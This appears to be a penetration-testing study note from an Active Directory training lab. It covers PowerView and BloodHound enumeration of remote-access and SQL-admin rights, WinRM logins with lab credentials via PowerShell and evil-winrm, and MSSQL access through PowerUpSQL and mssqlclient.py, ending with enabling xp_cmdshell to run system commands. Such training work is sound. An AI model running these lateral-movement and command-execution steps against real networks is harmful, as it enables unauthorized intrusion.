# More Powerview
```powershell
# Enumerating remote Desktop users
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"


# Enumerating management user groups for Winrm
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```

# Using #Bloodhound 
Searching for things in the execution rights tab on the node info tab.

Also using `cypher query` to look for users with this type of accesses. Paste this into the raw query box.
`MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2`

When looking for SQLAdmin you can put his query into the search. `MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2`

## Winrm session in Windows
```powershell
PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password) PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred [ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> hostname ACADEMY-EA-MS01 [ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> Exit-PSSession PS C:\htb>

# Installing on Kali side
gem install evil-winrm
evil-winrm -i 10.129.201.234 -u forend
```

## MSSQLClient
```powershell
# Powershell
PS C:\htb> cd .\PowerUpSQL\
PS C:\htb>  Import-Module .\PowerUpSQL.ps1
PS C:\htb>  Get-SQLInstanceDomain

Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'

# Linux
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```

```shellsession
SQL> enable_xp_cmdshell
xp_cmdshell whoami /priv
```